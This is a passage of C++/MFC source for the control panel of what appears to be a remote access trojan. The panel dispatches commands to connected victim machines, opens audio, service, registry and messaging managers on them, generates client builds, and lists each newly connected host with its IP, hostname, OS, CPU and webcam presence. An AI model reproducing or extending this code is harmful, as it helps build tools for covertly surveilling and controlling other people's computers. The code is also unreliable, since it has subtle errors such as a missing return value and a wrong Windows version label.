	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgAudioManager* Dialog = new CDlgAudioManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_AUDIO_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = AUDIO_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonCleanManager()
{
	MessageBox("OnButtonCleanManager", "OnButtonCleanManager");
	return;
}
VOID CXsServerDlg::OnButtonVideoManager()
{
	MessageBox("OnButtonVideoManager", "OnButtonVideoManager");
	return;
}
LRESULT CXsServerDlg::OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam)
{
	/*CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgVideoManager* Dialog = new CDlgVideoManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_VIDEO_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = VIDEO_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;*/
	return 0;
}
VOID CXsServerDlg::OnButtonServiceManager()
{
	BYTE IsToken = CLIENT_SERVICE_MANAGER_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgServiceManager* Dialog = new CDlgServiceManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_SERVICE_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = SERVICE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonRegisterManager()
{
	BYTE IsToken = CLIENT_REGISTER_MANAGER_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgRegisterManager* Dialog = new CDlgRegisterManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_REGISTER_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REGISTER_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonServerManager()
{
	MessageBox("OnButtonServerManager", "OnButtonServerManager");
	return;
}
//客户端生成
VOID CXsServerDlg::OnButtonCreateClient()
{
	CDlgCreateClient Dlg;
	Dlg.DoModal();
	return;
}
VOID CXsServerDlg::OnButtonServerAbout()
{
	MessageBox("OnButtonServerAbout", "OnButtonServerAbout");
	return;
}

void CXsServerDlg::OnClose()
{
	//if (::MessageBox(NULL, "你确定？", "Remote", MB_OKCANCEL))
	{
		Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);   //立即销毁托盘

	 
	    //销毁通信引擎的类对象
		if (__IOCPServer != NULL)
		{
			delete __IOCPServer;
			__IOCPServer = NULL;
		}
     
		CDialogEx::OnClose();
	}
	//CDialogEx::OnClose();
}
void CXsServerDlg::OnNotifyIconDataShow()
{
	if (!IsWindowVisible())   //当前对话框是否是显示状态
        {
            //窗口不显示
            ShowWindow(SW_SHOW);
        }
        else
        {
            ShowWindow(SW_HIDE);
        }
}
void CXsServerDlg::OnNotifyIconDataExit()
{
	Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);
	CDialogEx::OnClose();
}
//用户上线请求
LRESULT CXsServerDlg::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CString ClientAddress, HostName, ProcessorNameString, IsWebCameraExist, WebSpeed, OSName;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	if (ContextObject == NULL)
	{
		return -1;
	}
	CString v1;
	try
	{
		int v20 = ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength();
		int v21 = sizeof(LOGIN_INFORMATION);
		if (ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() != sizeof(LOGIN_INFORMATION))
		{
			return -1;
		}
		LOGIN_INFORMATION* LoginInfo = 
			(LOGIN_INFORMATION*)ContextObject->m_ReceivedDecompressedBufferData.GetArray();
		sockaddr_in v2;
		memset(&v2, 0, sizeof(v2));
		int v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//主机名称
		HostName = LoginInfo->HostName;

		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
				OSName = "WindowsNT";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
				OSName = "Windows2000";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
				OSName = "WindowsXP";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
				OSName = "Windows2003";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
				OSName = "WindowsVista";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
				OSName = "Windows7";
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
				OSName = "Windows10";
		}
		//CPU
		ProcessorNameString = LoginInfo->ProcessorNameString;
		//网速
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		//摄像头
		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "有" : "无";

		//向控件添加信息
		AddListCtrlServerOnline(ClientAddress,
			HostName, OSName, ProcessorNameString,
			IsWebCameraExist, WebSpeed, ContextObject);
		//ContextObject 是放在控件中的隐藏项中
	}
	catch(...){ }
}
VOID CXsServerDlg::AddListCtrlServerOnline(CString ClientAddress,
	CString HostName,
	CString OSName, CString ProcessorNameString, CString IsWebCameraExist,
	CString WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(),
		ClientAddress);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, HostName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, OSName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, ProcessorNameString);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 4, IsWebCameraExist);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 5, WebSpeed);

	m_CListCtrl_Server_Dialog_Online.SetItemData(i, (ULONG_PTR)ContextObject);
	ShowDialogMessage(TRUE, ClientAddress + "主机上线");

}
LRESULT CXsServerDlg::OnOpenRemoteMessageDialog(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	
	CDlgRemoteMessage* Dialog = new CDlgRemoteMessage(this, __IOCPServer, ContextObject);
	Dialog->Create(IDD_DIALOG_REMOTE_MESSAGE, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	return 0;
}